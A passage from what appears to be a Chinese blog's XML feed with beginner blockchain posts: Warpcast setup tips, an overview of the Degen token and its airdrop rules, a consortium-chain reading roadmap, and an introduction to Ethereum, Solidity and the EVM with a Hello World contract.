href="https://warpcast.com/">https://warpcast.com/</a></p></li><li><p>去网页端绑定evm钱包</p></li><li><p>关注名人账号，优化信息流</p><p> @jessepollak base创始人</p><p> @vitalik.eth v神</p><p> …</p><p> @arespollo pollo 把我关注的都关注一下，顺带也关注我lol</p></li><li><p>名词科普</p><p> Cast ：一条帖子，理解成推特的一条推文</p><p> Channel ：频道，类似豆瓣的小组，如degen channel</p><p> Warps ：没上链的货币，类比q币，没有价值，主要用途是用来奖励别人、购买空间、租频道</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>Road</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>Road</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>05-代币</title>
    <link href="/2024/08/02/BlockChain/Road/05-%E4%BB%A3%E5%B8%81/"/>
    <url>/2024/08/02/BlockChain/Road/05-%E4%BB%A3%E5%B8%81/</url>
    
    <content type="html"><![CDATA[<h1 id="Degen代币"><a href="#Degen代币" class="headerlink" title="Degen代币"></a>Degen代币</h1><h2 id="Degen-代币的起源与发展"><a href="#Degen-代币的起源与发展" class="headerlink" title="Degen 代币的起源与发展"></a>Degen 代币的起源与发展</h2><p>Degen 代币的历史可以追溯到 2024 年 1 月在 Base 链上的首次推出。从 Farcaster 社区的 &#x2F;degen 频道开始,Degen 凭借其独特的激励机制和迷因文化,迅速在加密货币社区内掀起了轰动,并为其后续的发展奠定了坚实的基础。</p><h3 id="Degen-的早期发展"><a href="#Degen-的早期发展" class="headerlink" title="Degen 的早期发展"></a>Degen 的早期发展</h3><ul><li>Farcaster 社区<ul><li>Farcaster 作为一个去中心化的社交应用,以其独特的社交互动方式和强调隐私保护而受到关注。在 Farcaster 上,用户可以分享、讨论和互动,同时利用区块链技术保证内容的真实性和不可篡改性。</li></ul></li><li>&#x2F;degen 频道<ul><li>&#x2F;degen 频道作为 Farcaster 上最早的频道之一,由 Warpcast 团队推出,迅速成为讨论加密货币价格和分享投资经历的热门场所。</li></ul></li><li>Degen 的推出<ul><li>2024 年 1 月,Degen 在 Base 链上推出,并通过对 &#x2F;degen 频道社区成员的空投活动,展现了其独有的激励机制和迷因文化,促进了社区内全新的社交互动方式。</li></ul></li></ul><h3 id="Degen-的-Tokenomics"><a href="#Degen-的-Tokenomics" class="headerlink" title="Degen 的 Tokenomics"></a>Degen 的 Tokenomics</h3><ul><li>总供应量<ul><li>约 370 亿 DEGEN 代币,其中 70% 分配给社区,15% 分配给流动性池,15% 用于开发团队、早期投资者和生态系统持续改进。</li></ul></li><li>天使轮融资<ul><li>2 月 Degen 完成了 490.5 枚 ETH 的天使轮融资,由 1confirmation 领投,Farcaster OG 和其他机构参与。</li></ul></li><li>市值表现<ul><li>根据 4.23 CMC 数据,Degen 市值 422M,FDV 1.1B。</li></ul></li></ul><h3 id="Degen-Chain-的推出"><a href="#Degen-Chain-的推出" class="headerlink" title="Degen Chain 的推出"></a>Degen Chain 的推出</h3><ul><li>Degen Chain 的建立<ul><li>Degen 的开发团队与 Syndicate 合作,推出了基于 Base 链的 L3 —— Degen Chain。这为 Degen 提供了强大的技术支持和扩展性,同时将其市场估值推向新高。</li></ul></li><li>Degen Chain 的特点<ul><li>Degen Chain 由 Degen 社区建立,采用 Arbitrum Orbit 构建,以 Base 链为结算层,并利用 AnyTrust 为数据可用性提供支持。其原生 gas 代币为 DEGEN。</li></ul></li><li>Degen Chain 的应用<ul><li>Degen Chain 不仅为支付、游戏等领域的新实验提供了支持,而且通过 Syndicate 提供的开发者工具,为在 Degen Chain 上的开发者提供了免费的 gas,促进了创新应用的开发。</li></ul></li></ul><h3 id="Degen-Chain-的成就"><a href="#Degen-Chain-的成就" class="headerlink" title="Degen Chain 的成就"></a>Degen Chain 的成就</h3><ul><li>交易量<ul><li>自平台启动以来,Degen Chain 上的 DegenSwap 交易平台在短短四天内就实现了近 1 亿美元的交易量。</li></ul></li><li>交易数量<ul><li>DegenSwap 在短时间内完成了超过 272,000 笔独特交易。</li></ul></li><li>合约数量<ul><li>DegenSwap 托管了超过 7,500 个合约和 2,300 个代币。</li></ul></li><li>发展潜力<ul><li>Degen Chain 在推动区块链创新和加速社区代币应用方面展现了巨大的潜力。</li></ul></li></ul><h2 id="degen的打赏文化以及空投"><a href="#degen的打赏文化以及空投" class="headerlink" title="degen的打赏文化以及空投"></a>degen的打赏文化以及空投</h2><p>degen 代币是创建于以太坊2层网络 base 链上的一个去中心化网络 farcaster 上的社区代币。degen更多是用来做打赏使用，你收到多少打赏积分，就可以兑换多少的degen代币空投。</p><h3 id="degen的打赏方式"><a href="#degen的打赏方式" class="headerlink" title="degen的打赏方式"></a>degen的打赏方式</h3><ul><li>degen空投阶段2<ul><li>这是一个链下的方式,使用degen points积分,月末可以将degen积分兑换为degen代币。</li></ul></li><li>第三方机器人或者frame打赏<ul><li>比如jeeves 或者paybot,通过这些第三方机器人进行degen代币转账。</li></ul></li></ul><h3 id="degen空投的条件和流程"><a href="#degen空投的条件和流程" class="headerlink" title="degen空投的条件和流程"></a>degen空投的条件和流程</h3><ul><li>发帖要求<ul><li>至少要发三条帖子,就是要cast三次。</li></ul></li><li>钱包验证<ul><li>必须要将warpcast在设置里面验证一个钱包地址,且钱包里面必须至少要有1万个degen代币。</li></ul></li><li>钱包存款<ul><li>钱包里面必须至少要有1万个degen代币。</li></ul></li></ul><p>上面3个条件满足之后，至少要过48小时之后，你才能有打赏条件degen 积分可以1比1兑换为degen代币，</p><p>在<a href="https://degen.tips/">https://degen.tips</a> 这个网站兑换，月末进行兑换，大约会有一个月时间来兑换。</p><p>除了链下的degen打赏，还有链上的，主要是通过degen jeeves 以及paybot这两个机器人来打赏。</p><p>感兴趣的，可以看这篇文章：<a href="https://paragraph.xyz/@houseofdegen/degen-tipping">https://paragraph.xyz/@houseofdegen/degen-tipping</a></p>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>Road</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>Road</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>04-联盟链</title>
    <link href="/2024/08/02/BlockChain/Road/04-%E8%81%94%E7%9B%9F%E9%93%BE/"/>
    <url>/2024/08/02/BlockChain/Road/04-%E8%81%94%E7%9B%9F%E9%93%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="Consortium-Blockchain-roadmap-2024"><a href="#Consortium-Blockchain-roadmap-2024" class="headerlink" title="Consortium Blockchain-roadmap 2024"></a>Consortium Blockchain-roadmap 2024</h1><p>联盟链学习路线总结，不断更新。</p><p>—— By 浙江大学区块链协会（Zhejiang University BlockChain Association, ZJUBCA）</p><h2 id="第一层"><a href="#第一层" class="headerlink" title="第一层"></a>第一层</h2><ul><li><strong>基本概念</strong>：<ul><li>什么是公有链、联盟链和私有链？(万向区块链实验室动画教程) <a href="https://v.qq.com/x/page/a0328vol40v.html">🔗</a></li><li>Blockchain Consortium: Advantages And Disadvantages<a href="https://dataconomy.com/2023/01/blockchain-consortium-advantages/">🔗</a></li><li>A Complete Guide to Consortium Blockchain And Its Features<a href="https://www.analyticsvidhya.com/blog/2023/01/a-complete-guide-to-consortium-blockchain-and-its-features/">🔗</a></li><li>Everything You Need To Know About Consortium Blockchain<a href="https://www.blockchain-council.org/blockchain/everything-you-need-to-know-about-consortium-blockchain/">🔗</a></li></ul></li><li><strong>解读与讨论</strong>：<ul><li>联盟链战国：五大巨头横向对比 <a href="https://www.infoq.cn/article/5-consortium-blockchain-comparison/">🔗</a></li><li>基于联盟链技术的隐私保护金融应用研究报告 <a href="https://www.bfia.org.cn/upload/file/20221201/1669860599908060153.pdf">🔗</a></li><li>研报：连通公链和联盟链的研究 <a href="https://www.8btc.com/article/6582723">🔗</a></li><li>安全问题成短板，联盟链发展背后的安全如何保障？<a href="https://www.chainnews.com/articles/576303926328.htm">🔗</a></li><li>联盟链智能合约安全浅析 <a href="https://paper.seebug.org/1317/">🔗</a></li><li>怎样让你的区块链更加安全可控<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/1_conception/safe_and_controllable.html">🔗</a></li><li>盘点国内联盟链及现状 <a href="https://zhuanlan.zhihu.com/p/519283107">🔗</a></li></ul></li></ul><h2 id="第二层"><a href="#第二层" class="headerlink" title="第二层"></a>第二层</h2><ul><li><strong>技术原理</strong><ul><li>共识机制<ul><li>区块链共识机制浅谈：<a href="https://blog.csdn.net/jeffrey__zhou/article/details/56672948">🔗</a></li><li>[区块链] 共识算法之争（PBFT，Raft，PoW，PoS，DPoS，Ripple）:<a href="https://www.cnblogs.com/X-knight/p/9157814.html">🔗</a></li><li>深度分析 Raft 的主要特点：<a href="https://mp.weixin.qq.com/s/yxJNsFzhpShzRvU9djhTjQ">🔗</a></li><li>Paxos，Raft，Zab 一致性协议-Raft 篇：<a href="https://mp.weixin.qq.com/s/5EZ2_vIzHEymJPxeSZtlmg">🔗</a></li><li>深入剖析区块链的共识算法 Raft &amp; PBFT：<a href="https://mp.weixin.qq.com/s/ITCaMKdYrdlvQ0IGW3qpKg">🔗</a></li></ul></li><li>密码学相关<ul><li>RSA、ECC、国密等加密算法</li><li>数字签名</li><li>零知识证明</li><li>多方安全计算</li></ul></li><li>网络通信<ul><li>联盟链网络专栏(Hyperledger Fabric)：<a href="https://hyperledger-fabric.readthedocs.io/zh_CN/latest/network/network.html">🔗</a></li><li>【网络专栏】联盟链的通信安全如何保障？：<a href="https://tech.hyperchain.cn/wang-luo-zhuan-lan-lian-meng-lian-de-tong-xin-an-quan-ru-he-bao-zhang/">🔗</a></li></ul></li><li>存储相关<ul><li>IPFS：<a href="https://docs.ipfs.tech/">🔗</a></li><li>传统数据库如 mysql、CouchDB、MongoDB 等</li></ul></li><li>智能合约<ul><li>智能合约初探：概念与演变：<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/3_features/35_contract/smart_contract_concept_and_evolution.html">🔗</a></li><li>联盟链的智能合约多采用 go、java 等语言编写，不同联盟链框架对合约语言的支持不同，可根据需要进一步学习</li></ul></li></ul></li><li><strong>源码分析</strong><ul><li>《Hyperledger Fabric 源代码分析与深入解读》</li><li>Hyperledger Fabric v2.x 最新资料汇总<a href="https://hello2mao.github.io/2020/04/22/hyperledger-fabric-v2.x-info/">🔗</a></li><li>Fabric2.2 中的 Raft 共识模块源码分析<a href="https://www.cnblogs.com/GarrettWale/p/16131853.html">🔗</a></li><li>深入浅出 FISCO BCOS<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/articles/index.html">🔗</a></li><li>FISCO BCOS 核心模块设计解析<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/docs/design/index.html">🔗</a></li></ul></li></ul><h2 id="第三层"><a href="#第三层" class="headerlink" title="第三层"></a>第三层</h2><ul><li><strong>联盟链实例</strong><ul><li>Hyperledger Fabric<ul><li>Hyperledger Fabric 是由 Linux 基金会支持的开源项目，提供了一种可扩展、可定制和安全的联盟链技术。</li><li>官网：<a href="https://www.hyperledger.org/use/fabric">🔗</a></li><li>paper:<a href="https://arxiv.org/pdf/1801.10228.pdf">🔗</a></li><li>官方文档：<a href="https://hyperledger-fabric.readthedocs.io/en/release-2.5/">🔗</a></li><li>中文文档：<a href="https://hyperledgercn.github.io/hyperledgerDocs/">🔗</a></li><li>中文视频 Tutorial：<a href="https://wiki.hyperledger.org/display/TWGC/Fabric+Video+Tutorial">🔗</a></li><li>FAQ：<a href="https://github.com/Hyperledger-TWGC/FAQ">🔗</a></li><li>博客(Hyperledger Fabric 2.0 系列)：<a href="https://blog.csdn.net/qq_28540443/article/details/104265844">🔗</a></li><li>电子书《区块链技术指南》:<a href="https://github.com/yeasy/blockchain_guide">🔗</a></li><li>电子书《Hyperledger 源码分析之 Fabric》:<a href="https://github.com/yeasy/hyperledger_code_fabric">🔗</a></li></ul></li><li>R3 Corda(金融行业)<ul><li>R3 Corda 是一种用于金融行业的联盟链技术，提供了一种可扩展、安全和隐私保护的方法。</li><li>官网：<a href="https://r3.com/products/corda/">🔗</a></li><li>white paper：<a href="https://r3.com/blog/corda-technical-whitepaper/">🔗</a></li><li>官方文档：<a href="https://docs.r3.com/">🔗</a></li><li>中文文档：<a href="https://cncorda.readthedocs.io/zh_CN/latest/index.html">🔗</a></li><li>developer training:<a href="https://training.corda.net/">🔗</a></li><li>FAQ:<a href="https://docs.r3.com/en/platform/corda/4.9/enterprise/notary/faq/toctree.html">🔗</a></li></ul></li><li>FISCO BCOS(国内金链盟)<ul><li>FISCO BCOS 是由国内企业主导研发、对外开源、安全可控的企业级金融联盟链底层平台，由金链盟开源工作组协作打造，并于 2017 年正式对外开源。</li><li>官网：<a href="https://www.fisco.com.cn/fisco_20.html">🔗</a></li><li>white paper:<a href="https://github.com/FISCO-BCOS/whitepaper">🔗</a></li><li>中文文档：<a href="https://fisco-bcos-documentation.readthedocs.io/zh_CN/latest/">🔗</a></li><li>英文文档：<a href="https://fisco-bcos-documentation.readthedocs.io/en/latest/index.html">🔗</a></li><li>博客：<a href="https://www.wanghaoyi.com/fisco-bcos-learning.html">🔗</a></li><li>FAQ：<a href="https://fisco-bcos-documentation.readthedocs.io/en/latest/docs/faq/faq.html">🔗</a></li></ul></li><li>Quorum(基于以太坊代码库)<ul><li>Quorum 是由美国金融机构摩根大通推出的企业级分布式账本和智能合约平台，可看作企业版的以太坊。它是基于以太坊分布式账本协议开发而成，为金融服务行业提供以太坊许可链方案，以便支持交易与合约的隐私性。</li><li>官网：<a href="https://quorum.com/">🔗</a></li><li>white paper:<a href="https://github.com/ConsenSys/quorum/blob/master/docs/Quorum%20Whitepaper%20v0.2.pdf">🔗</a></li><li>官方 Tutorial：<a href="https://docs.goquorum.consensys.net/">🔗</a></li></ul></li></ul></li><li><strong>应用实例</strong><ul><li>金融服务：<ul><li>项目：taXchain - A blockchain network to exchange digitized tax forms(Hyperledger Fabric)<a href="https://www.hyperledger.org/learn/publications/taxchain-case-study">🔗</a></li><li>项目：fragmos chain - Digitizing interactions between OTC derivatives market participants(R3 Corda)<a href="https://r3.com/case-studies/fragmos-chain/">🔗</a></li><li>项目：Spunta - Revolutionizing the interbank reconciliation process in Italy(R3 Corda)<a href="https://r3.com/case-studies/spunta/">🔗</a></li><li>项目：广东国税税链项目（蚂蚁链）<a href="https://guangdong.chinatax.gov.cn/gdsw/gzsw_swxw/2021-10/08/content_323f08675f604b629f233b5f38707d91.shtml">🔗</a></li><li>项目：浙江区块链电子票据平台（蚂蚁链）<a href="https://www.zjzwfw.gov.cn/col/col1228922696/">🔗</a></li></ul></li><li>供应链管理：<ul><li>项目：KrypC - Managing the Metal and Mining Industry’s Supply Chain(Hyperledger Fabric)<a href="https://www.hyperledger.org/learn/publications/krypc-minehub-case-study">🔗</a></li><li>项目：gavea - Automating the commodity trading process(R3 Corda)<a href="https://r3.com/case-studies/gavea/">🔗</a></li><li>项目：axedra - Connecting and digitizing the precious metals industry(R3 Corda)<a href="https://r3.com/case-studies/axedras/">🔗</a></li></ul></li><li>电子政务：<ul><li>项目：澳门智慧城市-证书电子化（FISCO BCOS）</li><li>项目：山东省荣成市区块链政务诚信管理系统（FISCO BCOS)</li><li>项目：安徽区块链电子证照应用（蚂蚁链）<a href="https://sft.ah.gov.cn/public/7061/53866131.html">🔗</a></li></ul></li><li>智慧医疗：<ul><li>项目：LedgerDomain - The Right Rx for the Pharmaceutical Supply Chain(Hyperledger Fabric)<a href="https://www.hyperledger.org/learn/publications/ledgerdomain-case-study">🔗</a></li><li>项目：武汉市中心医院&#x2F;上海华山医院-区块链医疗电子处方（蚂蚁链）<a href="https://developer.aliyun.com/article/697162">🔗</a></li></ul></li><li>版权保护：<ul><li>项目：人民版权-区块链版权保护平台（FISCO BCOS）<a href="https://www.peoplec.cn/">🔗</a></li><li>项目：雀凿数字版权服务平台（蚂蚁链）<a href="https://www.mydcs.com/pages/index?channelCode=WBLT">🔗</a></li></ul></li><li>其他：<ul><li>项目：Sony Global Education - a Next-Generation Credentials Platform(Hyperledger Fabric)<a href="https://www.hyperledger.org/wp-content/uploads/2017/12/Hyperledger_CaseStudy_Sony.pdf">🔗</a></li><li>项目：绿色出行普惠平台-绿色碳交易积分区块链（FISCO BCOS)</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>BlockChain</category>
      
      <category>Road</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BlockChain</tag>
      
      <tag>Road</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>03-Dapp</title>
    <link href="/2024/08/02/BlockChain/Road/03-Dapp/"/>
    <url>/2024/08/02/BlockChain/Road/03-Dapp/</url>
    
    <content type="html"><![CDATA[<h1 id="初探以太坊-Dapp-开发"><a href="#初探以太坊-Dapp-开发" class="headerlink" title="初探以太坊 Dapp 开发"></a>初探以太坊 Dapp 开发</h1><p>BY ZJUBCA</p><p>本文假设读者已经对区块链有了基本的概念，如果你对诸如区块链、智能合约与 Dapp 这类词语完全陌生，那么我们建议读者先阅读协会的：<a href="../index.md">🔗ZJUBCA-Roadmap</a></p><h2 id="以太坊技术原理"><a href="#以太坊技术原理" class="headerlink" title="以太坊技术原理"></a>以太坊技术原理</h2><h3 id="一、什么是以太坊（Ethereum）"><a href="#一、什么是以太坊（Ethereum）" class="headerlink" title="一、什么是以太坊（Ethereum）"></a>一、什么是以太坊（Ethereum）</h3><p>对以太坊的定义往往仁者见仁，但如果集大成来解释，以太坊是基于状态转换的「世界计算机」（所有人都可以访问并使用的计算机，不受空间限制）</p><p>从计算机科学的角度来看，以太坊是一种确定但无界的由交易驱动的「状态机」（改变程序或系统保存的信息并保持共识的机体），它由全局可访问的离散单个状态和将变化应用于这种状态的虚拟机组成；从更实际的角度来看，以太坊是一种开源、在全球范围内呈去中心化并且能够执行「智能合约」（下文会详述，可简单理解为代码）的基础设施。</p><p>在以太坊平台上，开发人员能够构建具有内置经济功能的强大的去中心化应用程序。它使用区块链来同步和存储系统的状态变化，并使用一种被称为「以太币」（Ether）的加密货币来计量和限制执行资源成本，提供了高可用性，可审计性，透明性和中立性。</p><p><a href="https://kauri.io/#collections/A%20Hackathon%20Survival%20Guide/ethereum-101-part-1-what-is-ethereum/">🔗 以太坊白皮书</a></p><h3 id="二、深入理解以太坊技术原理"><a href="#二、深入理解以太坊技术原理" class="headerlink" title="二、深入理解以太坊技术原理"></a>二、深入理解以太坊技术原理</h3><p>可能大家对上一节中提到的「状态机」的概念还有点模糊不清，为了让大家更清晰的深入到以太坊的技术原理中去，本节会以传统互联网为起点，循序渐进至以太坊的底层技术原理。</p><p>用计算机技术来说，以太坊就是一个保存了数字交易永久记录的「公共数据库」。重要的是，这个数据库不需要任何中间方来维护双方的权益。相反，它可以作为一种「无需信任」的交易系统来运作，也就是你可以在不需要第三方的情况下进行点对点（P2P）交易。<br><img src="/./pic/1.png"></p><p>以太坊区块链本质上是一个为交易服务的状态机。在计算机科学中，一个状态机指的是这样一种东西，它可以读取一系列的输入，并基于这些输入产生一个新的状态。</p><p><img src="/./pic/2.png"></p><p>以太坊状态机的运行从一个「元状态」开始，这类似于在网络上没有发生任何交易之前的一个空白匣子。当交易执行时，这个元状态就转变为一些最终状态。在任何时候，这个最终状态都代表着以太坊区块链的现状。</p><p><img src="/./pic/3.png"></p><p>以太坊系统中运行着数百万笔交易，这些交易被分组归类为「区块」。每个区块由「区块头」（Header）和一系列「交易信息」(Transactions）组成。在这里，你可以简单地将区块头理解为一个包含决定区块链共识状态关键信息的 “数据集合”， 每个块只有通过对区块头的验证，才能与其前面的区块通过区块头串联在一起形成有向无环的链式结构。</p><p><img src="/./pic/4.png"></p><p>前文中提到，以太坊是由交易驱动的状态机。那么要想以太坊正确的从一个状态转到另一个状态，必须证明交易是有效且真实的，否则以太坊便失去了其不需要第三方维护这一核心价值。要想证明一个交易是有效的，就必须通过一个验证过程，这一过程称为「挖矿」。</p><p>挖矿是指一组节点（即物理意义上的计算机）消耗它们的计算资源来创建一个有效交易的区块（这里仅以 Pow 为例）。网络中参与挖矿的节点被称为「矿工」。任何声明自己是「矿工」的节点都可以尝试创建和验证区块，全世界有许多矿工试图同时创建和验证区块。每个矿工在向区块链提交一个区块时同时，都要提供一个数学的证明，且把这个证明作为一个保证：如果这个数学证明存在，则该区块必然是有效的。</p><p>一个矿工如果想要在主区块链上添加一个合法区块，就必须比其他矿工更快地对其证明。那么，通过让矿工提供数学证明来验证每个区块的过程被称为「工作量证明」。</p><p>那么矿工为什么要消耗自己的计算机资源来验证并添加区块呢？答案是价值回报。任何完成这个验证工作的矿工都可以得到一定数额的价值回报。以太坊正是采用其链上数字货币「以太币」作为奖励。 每当一个矿工证明了一个区块，就会生成并得到一定数量的以太币。</p><p>正如我们在上文给区块链的定义，区块链是一个具有共享状态的交易状态机。这个定义决定了，区块链的当前状态是一个单一的全局状态，每个人都必须接受。如果拥有多个链（状态）会破坏整个系统，因为人们不可能就哪个状态是正确的状态达成一致意见。如果这些链是分开的，就会出现一个人在一条链上有 10 个以太币，在另一条链上有 20 个的情况。在这种情况下，我们没有办法确定哪一个链最「有效」，无法确定一个人有多少有效的以太币。</p><p>这一产生多条链的过程，被称为「分叉」（Fork）。因为分叉会破坏系统，因此我们通常会避免分叉，要求或者说迫使人们选择他们「相信」唯一有效的一条链。</p><p><img src="/./pic/5.png"></p><p>为了确定哪个路径是最有效的，并防止分叉的发生，以太坊使用了一种叫做「GHOST 协议」的机制。简单地说，GHOST 协议让我们必须选择在链上做「最多计算」的路径。确定该路径的一种方法是通过计算每条链所使用最新区块的数量，来表示当前每条链上的区块总数（不包括创世区块）。块数越多，路径越长，则说明挖矿的难度越大，因此该链就为最多计算链。因此这个方法也可以被简称为「最长链原则」。通过这个方式，最终使每一个节点对当前区块链的状态（链）的唯一性达成共识。</p><p><img src="/./pic/6.png"></p><p>到这里，我们就对以太坊区块链就有了一个宏观的认识。在这个链式架构的基础上，以太坊系统由如下所述的各主要组成部分支撑，如果你想更深入的了解这些，我们推荐你阅读以太坊黄皮书，不过请注意，他并没有那么易懂~</p><p><a href="https://gitcode.net/mirrors/wanshan1024/ethereum_yellowpaper">🔗 以太坊黄皮书</a></p><ul><li>帐户；</li><li>状态；</li><li>Gas 与费用；</li><li>交易；</li><li>区块；</li><li>交易执行；</li><li>挖矿；</li><li>工作量证明。</li></ul><h2 id="Solidity-及-EVM"><a href="#Solidity-及-EVM" class="headerlink" title="Solidity 及 EVM"></a>Solidity 及 EVM</h2><h3 id="一、Solidity——面向合约对象的编程语言"><a href="#一、Solidity——面向合约对象的编程语言" class="headerlink" title="一、Solidity——面向合约对象的编程语言"></a>一、Solidity——面向合约对象的编程语言</h3><p>Solidity 是由以太坊创始人之一的 Gavin Wood 所编写，是一门面向合约的、为实现智能合约而创建的高级编程语言。这门语言受到了 C++，Javascript 等语言的影响，属于静态类型语言，支持继承、库和复杂的用户定义类型等特性。其设计目的是为了能在以太坊虚拟机（EVM）上运行。</p><p>众所周知，以太坊之所以被称为区块链 2.0 的开山鼻祖，其中重要的一点就是实现了「图灵完备」。所谓图灵完备，就是一切可计算的问题都能计算，这样的虚拟机或者编程语言就叫图灵完备的，图灵完备通常指具有无限存储能力的通用物理机器或编程语言。那么与图灵完备相反的是图灵不完备，比如比特币的脚本系统，就是图灵不完备的。要想充分发挥以太坊图灵完备的优势，就要通过编写运行在 EVM 上（也可以理解为链上）的「智能合约」。那么 Solidity，就是编写智能合约的编程语言。</p><p>当然，除了 Solidity 以外，还有例如与 Python 接近的、文件名以.se 结尾 Serpent 编程语言也曾经流行过一段时间，除此之外也有开发者更喜欢使用 Vyper。但随着时间的推移和开发者们不断地学习和迭代，现在最成熟且应用最多的当数是 Solidity 了，因此这也是我们鼓励大家学习它的原因。</p><p>以下是通过 Solidity 编写的“Hello Wordl!”代码，其中，^0.8.0 是编译器的版本号，HelloWorld 是合约名，greet 是状态变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-Lisence-Identifier: MIT<br>// compiler version must be greater than or equal to 0.8.10 and less than 0.9.0<br>pragma solidity ^0.8.10;<br><br>contract HelloWorld &#123;<br>  string public greet = &quot;Hello World!&quot;;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果你已经迫不及待的想要成为一名智能合约开发者，那么以下列出的学习工具一定有助于你：</p><ul><li>Remix —智能合约在线开发工具：<a href="https://remix.ethereum.org/">🔗</a></li><li>Solidity 最新(0.8.0)中文文档：<a href="https://learnblockchain.cn/docs/solidity">🔗</a></li><li>Cryptozombies —玩游戏的方式学习 Solidity：<a href="https://cryptozombies.io/">🔗</a></li><li>Solidity by Example —以太坊官方教程：<a href="https://solidity-by-example.org/">🔗</a></li></ul><h3 id="二、EVM——基于堆栈的以太坊虚拟机"><a href="#二、EVM——基于堆栈的以太坊虚拟机" class="headerlink" title="二、EVM——基于堆栈的以太坊虚拟机"></a>二、EVM——基于堆栈的以太坊虚拟机</h3><p>在了解 EVM 之前，首先清楚什么是虚拟机？传统的虚拟机指的是，通过软件模拟的，具备完整硬件系统功能，并运行在隔离环境下的完整计算机系统，比如 VMware、Java 虚拟机等。<br>那么什么是以太坊虚拟机呢？</p><p>以太坊虚拟机的英文全称为“Ethereum Virtual Machine”，简称为 EVM，这个 EVM 就是建立在以太坊区块链上的代码运行环境，是一个完全独立的沙盒，合约代码可对外完全隔离并在 EVM 内部运行，其主要作用是处理以太坊系统内的智能合约。上文提到的 Solidity 代码在部署到以太坊网络之前需要被编译成字节码。这个字节码所对应的底层机制，实际上就是 EVM 所解析的一系列操作码指令，然后由 EVM 根据此操作码，真正的完成代码的执行。</p><p>从传统互联网的角度来说，程序员在为一个软件编写程序时，会使用到编程语言，例如 C++。但 C++ 是计算机的 CPU 无法理解的高级语言。程序员通过 C++ 编写好的程序需要通过编译器翻译成 CPU 可以理解的语言，即字节代码（机器语言），从而对 CPU 发号施令让软件可以在计算机上顺利运行。</p><p>如果听到这里你觉得有些困惑，不必担心，坚持看完下面的例子，一定能“柳暗花明又一村”。</p><p>假设一名 ZJUBCAer 小蓝是一个英语盲，但作为一名区块链爱好者，它需要经常查看一些英语文章来及时掌握行业信息。为了解决语言障碍，它会把文章通过翻译软件转译成中文再阅读。</p><p><img src="/./pic/8.png"></p><p>一篇用英语写成的文章被翻译为中文，变成了小蓝能看懂的语言，从而帮助小蓝能够轻松掌握区块链的行业信息。同理，一个用 C++ 编成的程序被编译为字节代码，变成 CPU 能看懂的语言，CPU 可以运行软件程序。<br>可这跟以太坊的 EVM 有什么关系？答案是，EVM 之于以太坊，就像 CPU 之于计算机。</p><p><img src="/./pic/9.png"></p><p>以太坊是一台世界级计算机，但它毕竟不是实体电脑，也没有 CPU，那么智能合约要如何在以太坊上运行呢？EVM 就是以太坊的 CPU，以太坊开发者们通过编程语言 Solidity 写好的程序，被编译为 EVM 可以理解的 EVM 字节代码，EVM 就可以运行智能合约的程序。</p><p>到这里，相信你一定对 EVM 有了初步的认识，如果你想更进一步，那么我们建议你通过 EVM 练兵场，通过学以致用的方式，更好的掌握 EVM 的底层逻辑。</p><p>EVM 练兵场：<a href="https://www.evm.codes/">🔗</a></p><h2 id="智能合约开发"><a href="#智能合约开发" class="headerlink" title="智能合约开发"></a>智能合约开发</h2><p>什么是智能合约？其实通过上文的阅读，相信读者已经大概做到了心中有数，以太坊网络上运行程序就称之为智能合约，它和其他的程序一样，也是代码和数据(状态)的集合。</p><p>智能合约（Smart Contract）和人工智能（Artificial Intelligence ）的智能没有关系，智能合约最早由尼克萨博在 95 年提出，它的概念很简单，就是将法律条文写成可执行代码。让法律条文的执行中立化，这个理念和区块链上的程序可以不被篡改、不被干预（只有有人触发交易，它将自动执行）的执行不谋而合，因此区块链引入了这个概念。以太坊网络上运行程序就称之为智能合约。</p><h3 id="一、以太坊客户端"><a href="#一、以太坊客户端" class="headerlink" title="一、以太坊客户端"></a>一、以太坊客户端</h3><p>大家都知道，如果想跟一个独立系统交互，仅仅编写了可以被该系统编译识别的代码还不够，还需要与该系统建立稳定的连接才能将数据传输过去。前文提到，以太坊虚拟机 EVM 是一个封闭的沙盒系统，其内部代码的运行是不受到外部世界的干扰的。那么，开发者如果想访问到以太坊并且期望与之交互应该怎么做呢？答案是通过以太坊客户端。</p><p>「以太坊客户端」是一个软件应用程序，它实现以太坊规范并通过 P2P 网络与其他以太坊客户端（节点）进行通信。如果不同的以太坊客户端符合参考规范和标准化通信协议，则可以进行相互操作。</p><p>以太坊是一个开源项目，由“黄皮书”正式规范定义。除了各种以太坊改进提案之外，此正式规范还定义了以太坊客户端的标准行为。因为以太坊有明确的正式规范，所以，任何一个独立开发的软件，只要实现了该范式，那他就可以作为一个以太坊节点，与以太坊或其它以太坊客户端交互。<br>目前以太坊客户端支持 8 种语言的客户端，这里推荐其中两款：</p><ul><li>go-ethereum（geth）<a href="https://github.com/ethereum/go-ethereum">🔗</a>：Golang 实现，官方推荐，开发使用最多</li><li>Parity<a href="https://github.com/ethcore/parity/releases">🔗</a>：Rust 实现，最轻便客户端，在历次以太网攻击中表现卓越</li></ul><h3 id="二、开发框架"><a href="#二、开发框架" class="headerlink" 